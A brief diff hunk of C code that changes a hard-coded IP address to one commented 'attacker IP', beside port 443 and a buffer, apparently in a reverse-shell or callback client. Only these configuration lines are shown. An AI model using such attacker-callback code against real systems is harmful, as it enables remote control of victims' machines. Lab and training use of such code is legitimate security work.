@@ -4,7 +4,7 @@
 #define BUFFER_SIZE 1024
 
 char buffer[BUFFER_SIZE];
-char ip[] = "192.168.56.103";
+char ip[] = "10.10.10.10"; //attacker IP
 int port = 443;
 
 
